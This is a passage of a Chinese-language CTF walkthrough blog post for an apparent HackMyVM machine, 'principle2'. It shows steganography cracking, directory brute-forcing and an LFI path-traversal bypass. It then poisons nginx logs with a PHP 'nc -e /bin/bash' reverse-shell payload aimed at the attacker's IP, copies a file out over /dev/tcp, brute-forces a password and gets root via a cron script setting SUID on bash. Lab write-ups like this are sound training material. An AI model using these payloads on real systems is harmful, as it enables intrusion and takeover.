+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: <span class="pl-s"><span class="pl-pds">"</span>soldierofanubis<span class="pl-pds">"</span></span>   
+[i] Original filename: <span class="pl-s"><span class="pl-pds">"</span>secret.txt<span class="pl-pds">"</span></span>.
+[i] Extracting to <span class="pl-s"><span class="pl-pds">"</span>prometheus.jpg.out<span class="pl-pds">"</span></span>.
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cat prometheus.jpg.out
+I have <span class="pl-c1">set</span> up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
+                                                                                                                                                                                              </pre></div>
+<p>图片里隐藏了一个域名，加入我们的hosts中</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f"><img src="https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f" alt="image" style="max-width: 100%;"></a></p>
+<p>此地无银三百两，爆破目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://thetruthoftalos.hmv/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,md,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 169] [--<span class="pl-k">&gt;</span> http://thetruthoftalos.hmv/uploads/]
+/index.html           (Status: 200) [Size: 8]
+/index.php            (Status: 200) [Size: 1970]
+Progress: 51629 / 311425 (16.58%)^C
+[<span class="pl-k">!</span>] Keyboard interrupt detected, terminating.
+Progress: 53720 / 311425 (17.25%)
+===============================================================
+Finished
+===============================================================
+</pre></div>
+<p><code class="notranslate">index.php</code>大小明显不一样</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70"><img src="https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70" alt="image" style="max-width: 100%;"></a></p>
+<p>你在输入框中输入点东西，你就会发现一些有趣的东西</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67"><img src="https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67" alt="image" style="max-width: 100%;"></a></p>
+<p>看着就像有<strong>本地文件包含漏洞</strong></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354"><img src="https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354" alt="image" style="max-width: 100%;"></a></p>
+<p>回显不对，应该要<strong>双重绕过</strong></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037"><img src="https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037" alt="image" style="max-width: 100%;"></a></p>
+<p>成功获得<code class="notranslate">/etc/passwd</code>，因为没有ssh端口，所以尝试一下日志包含，我们看一下它的架构</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09"><img src="https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09" alt="image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/log/nginx/access.log
+/var/log/nginx/error.log</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82"><img src="https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82" alt="image" style="max-width: 100%;"></a></p>
+<p>可以回显，我们构造一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ curl http://thetruthoftalos.hmv/shell -H <span class="pl-s"><span class="pl-pds">"</span>User-Agent: &lt;?php exec('nc -e /bin/bash 192.168.205.141 8888')  ?&gt;<span class="pl-pds">"</span></span>
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head&gt;&lt;title<span class="pl-k">&gt;</span>404 Not Found<span class="pl-k">&lt;</span>/title&gt;&lt;/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>center&gt;&lt;h<span class="pl-k">1&gt;</span>404 Not Found<span class="pl-k">&lt;</span>/h1&gt;&lt;/center<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>hr&gt;&lt;center<span class="pl-k">&gt;</span>nginx/1.22.<span class="pl-k">1&lt;</span>/center<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ curl http://thetruthoftalos.hmv/index.php<span class="pl-k">?</span>filename=....//....//....//....///var/log/nginx/access.log       
+
+</pre></div>
+<p>卡住就是弹回来了</p>
+<hr>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<hr>
+<h1>4.提权</h1>
+<p>上来以后转了一圈都没发现什么有意思的东西，我就直接甩了一个linpeas.sh上来了,也无果，但是查看pspy看定时任务的时候发现了这个</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b"><img src="https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b" alt="image" style="max-width: 100%;"></a></p>
+<p>但是我们没有修改的权限</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@principle2:/tmp$ ls -la /usr/local/share/report
+-rwxrwx--- 1 root talos 16584 Nov 25  2023 /usr/local/share/report
+
+principle2:/home/talos$ sudo -u talos cat /usr/local/share/report <span class="pl-k">&gt;</span> /tmp/report
+www-data@principle2:/home/talos$ <span class="pl-c1">cd</span> /tmp/
+www-data@principle2:/tmp$ cat report <span class="pl-k">&gt;</span> /dev/tcp/192.168.205.141/7777</pre></div>
+<p>拷过来看看具体运行什么</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ strings report 
+/lib64/ld-linux-x86-64.so.2
+fgets
+rewind
+perror
+fread
+<span class="pl-c1">exit</span>
+fopen
+strstr
+pclose
+__libc_start_main
+__cxa_finalize
+popen
+fclose
+fputs
+fwrite
+libc.so.6
+GLIBC_2.2.5
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+write www-data
+You are not allowed to be here
+Error sending message to www-data
+/opt/users.txt
+Error opening output file
+Error executing <span class="pl-s"><span class="pl-pds">'</span>who<span class="pl-pds">'</span></span> <span class="pl-c1">command</span>
+www-data
+New information appended to <span class="pl-s"><span class="pl-pds">'</span>/opt/users<span class="pl-pds">'</span></span>
+No new information to append
+<span class="pl-k">;</span><span class="pl-k">*</span>3<span class="pl-s"><span class="pl-pds">$"</span></span>
+<span class="pl-s">GCC: (Debian 13.2.0-5) 13.2.0</span>
+<span class="pl-s">Scrt1.o</span>
+<span class="pl-s">__abi_tag</span>
+<span class="pl-s">crtstuff.c</span>
+<span class="pl-s">deregister_tm_clones</span>
+<span class="pl-s">__do_global_dtors_aux</span>
+<span class="pl-s">completed.0</span>
+<span class="pl-s">__do_global_dtors_aux_fini_array_entry</span>
+<span class="pl-s">frame_dummy</span>
+<span class="pl-s">__frame_dummy_init_array_entry</span>
+<span class="pl-s">report.c</span>
+<span class="pl-s">__FRAME_END__</span>
+<span class="pl-s">_DYNAMIC</span>
+<span class="pl-s">__GNU_EH_FRAME_HDR</span>
+<span class="pl-s">_GLOBAL_OFFSET_TABLE_</span>
+<span class="pl-s">__libc_start_main@GLIBC_2.34</span>
+<span class="pl-s">_ITM_deregisterTMCloneTable</span>
+<span class="pl-s">fread@GLIBC_2.2.5</span>
+<span class="pl-s">_edata</span>
+<span class="pl-s">fclose@GLIBC_2.2.5</span>
+<span class="pl-s">_fini</span>
+<span class="pl-s">rewind@GLIBC_2.2.5</span>
+<span class="pl-s">pclose@GLIBC_2.2.5</span>
+<span class="pl-s">fputs@GLIBC_2.2.5</span>
+<span class="pl-s">fgets@GLIBC_2.2.5</span>
+<span class="pl-s">__data_start</span>
+<span class="pl-s">__gmon_start__</span>
+<span class="pl-s">__dso_handle</span>
+<span class="pl-s">_IO_stdin_used</span>
+<span class="pl-s">_end</span>
+<span class="pl-s">notifyNotAllowed</span>
+<span class="pl-s">__bss_start</span>
+<span class="pl-s">main</span>
+<span class="pl-s">popen@GLIBC_2.2.5</span>
+<span class="pl-s">fopen@GLIBC_2.2.5</span>
+<span class="pl-s">perror@GLIBC_2.2.5</span>
+<span class="pl-s">exit@GLIBC_2.2.5</span>
+<span class="pl-s">fwrite@GLIBC_2.2.5</span>
+<span class="pl-s">__TMC_END__</span>
+<span class="pl-s">_ITM_registerTMCloneTable</span>
+<span class="pl-s">__cxa_finalize@GLIBC_2.2.5</span>
+<span class="pl-s">_init</span>
+<span class="pl-s">strstr@GLIBC_2.2.5</span>
+<span class="pl-s">.symtab</span>
+<span class="pl-s">.strtab</span>
+<span class="pl-s">.shstrtab</span>
+<span class="pl-s">.interp</span>
+<span class="pl-s">.note.gnu.property</span>
+<span class="pl-s">.note.gnu.build-id</span>
+<span class="pl-s">.note.ABI-tag</span>
+<span class="pl-s">.gnu.hash</span>
+<span class="pl-s">.dynsym</span>
+<span class="pl-s">.dynstr</span>
+<span class="pl-s">.gnu.version</span>
+<span class="pl-s">.gnu.version_r</span>
+<span class="pl-s">.rela.dyn</span>
+<span class="pl-s">.rela.plt</span>
+<span class="pl-s">.init</span>
+<span class="pl-s">.plt.got</span>
+<span class="pl-s">.text</span>
+<span class="pl-s">.fini</span>
+<span class="pl-s">.rodata</span>
+<span class="pl-s">.eh_frame_hdr</span>
+<span class="pl-s">.eh_frame</span>
+<span class="pl-s">.init_array</span>
+<span class="pl-s">.fini_array</span>
+<span class="pl-s">.dynamic</span>
+<span class="pl-s">.got.plt</span>
+<span class="pl-s">.data</span>
+<span class="pl-s">.bss</span>
+<span class="pl-s">.comment</span>
+<span class="pl-s">                       </span></pre></div>
+<p>没有发现什么明显利用点，想着拿之前的密码尝试登录的时候发现有之前SMB服务的<code class="notranslate">hermanubis</code>用户（骂的很脏）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@principle2:/tmp$ ls /home/
+byron  city  hermanubis  melville  talos
+
+www-data@principle2:/tmp$ su - hermanubis
+Password: 
+$ id
+uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)
+$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> hermanubis on principle2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, use_pty
+
+User hermanubis may run the following commands on principle2:
+    (talos) NOPASSWD: /usr/bin/cat
+
+$ <span class="pl-c1">cd</span> /home/hermanubis
+$ ls
+investigation.txt  share  user.txt
+$ cat investigation.txt 
+I am aware that Byron hates me... especially since I lost my password.
+My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
+What he doesn<span class="pl-s"><span class="pl-pds">'</span>t know is that it is in the Byron database...</span>
+<span class="pl-s"></span>
+<span class="pl-s"># 翻译</span>
+<span class="pl-s">我知道拜伦讨厌我……尤其是自从我忘记密码之后。</span>
+<span class="pl-s">我和我的朋友们经过多次分析和攻击，发现梅尔维尔使用的密码是 32 个字符……</span>
+<span class="pl-s">但他不知道的是，这个密码就在拜伦的数据库中……</span></pre></div>
+<p>Byron就是之前那个市长，32个字符就是那个16进制表，拿过来爆破一下就好了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ <span class="pl-c1">cd</span> /tmp
+$ ./suForce -u melville -w a.txt 
+            _____                        
+ ___ _   _ <span class="pl-k">|</span>  ___<span class="pl-k">|</span>__  _ __ ___ ___   
+/ __<span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">||</span> <span class="pl-k">|</span>_ / _ <span class="pl-cce">\|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ __/ _ \ </span>
+<span class="pl-s">\__ \ |_| ||  _| (_) | | | (_|  __/  </span>
+<span class="pl-s">|___/\__,_||_|  \___/|_|  \___\___|  </span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s"> code: d4t4s3c     version: v1.0.0</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s">🎯 Username | melville</span>
+<span class="pl-s">📖 Wordlist | a.txt</span>
+<span class="pl-s">🔎 Status   | 54/1001/5%/1bd5528b6def9812acba8eb21562c3ec</span>
+<span class="pl-s">💥 Password | 1bd5528b6def9812acba8eb21562c3ec</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s">$ su - melville</span>
+<span class="pl-s">Password: </span>
+<span class="pl-s">root is watching you, it has a record of all your steps:</span>
+<span class="pl-s"></span>
+<span class="pl-s">melville@principle2:~$ id</span>
+<span class="pl-s">uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)</span>
+<span class="pl-s"></span></pre></div>
+<p>melville用户有<code class="notranslate">talos</code>的权限，可以修改/usr/local/share/report文件，我们把bash加个权限就好了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">melville@principle2:<span class="pl-k">~</span>$ vi /usr/local/share/report
+melville@principle2:<span class="pl-k">~</span>$ cat /usr/local/share/report
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+chmod +s /bin/bash</pre></div>
+<p>然后等就好了，等它定时任务触发</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">melville@principle2:/tmp$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
+melville@principle2:/tmp$ bash -p
+bash-5.2# id
+uid=1003(melville) gid=1003(melville) euid=0(root) egid=0(root) groups=0(root),1000(talos),1003(melville)
+</pre></div>
+<p>下班</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">7r1umph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("12/27/2024"!=""){
+    var startSite=new Date("12/27/2024");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+<script src='https://blog.meekdai.com/Gmeek/plugins/GmeekTOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>
+
+</html>
